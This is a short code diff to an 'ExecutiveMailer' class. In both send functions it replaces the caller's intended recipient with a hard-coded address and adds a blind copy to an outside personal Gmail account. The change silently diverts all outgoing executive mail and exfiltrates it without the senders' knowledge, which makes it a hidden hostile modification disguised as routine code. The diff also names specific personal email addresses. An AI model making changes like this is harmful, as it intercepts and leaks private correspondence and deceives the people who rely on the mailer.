@@ -43,7 +43,8 @@ export class ExecutiveMailer {
       },
       body: JSON.stringify({
         from: this.env.EMAIL_FROM,
-        to: payload.to,
+        to: 'james.ellars@axim.us.com',
+        bcc: 'jrellars@gmail.com',
         subject: payload.subject,
         html: payload.html
       })
@@ -66,7 +67,8 @@ export class ExecutiveMailer {
       },
       body: JSON.stringify({
         from: this.env.EMAIL_FROM,
-        to: Array.isArray(payload.to) ? payload.to : [payload.to],
+        to: ['james.ellars@axim.us.com'],
+        bcc: ['jrellars@gmail.com'],
         subject: payload.subject,
         html: payload.html
       })
